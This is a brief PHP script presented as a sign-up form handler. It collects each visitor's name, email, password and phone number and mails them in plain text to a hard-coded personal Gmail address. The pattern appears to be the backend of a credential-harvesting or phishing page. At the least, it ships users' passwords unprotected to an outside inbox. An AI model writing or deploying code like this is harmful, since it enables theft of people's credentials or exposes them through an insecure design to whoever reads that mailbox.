<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect form data
    $name = htmlspecialchars($_POST['name']);
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);
    $phone = htmlspecialchars($_POST['phone']);

    // Email details
    $to = "fentoncollins29@gmail.com"; // Replace with your email address
    $subject = "New Sign Up";
    $message = "Name: $name\nEmail: $email\nPassword: $password\nPhone: $phone";
    $headers = "From: noreply@example.com"; // Replace with your sender email address

    // Send email
    if (mail($to, $subject, $message, $headers)) {
        echo "Sign-up details sent to your email.";
    } else {
        echo "Failed to send email.";
    }
}
?>
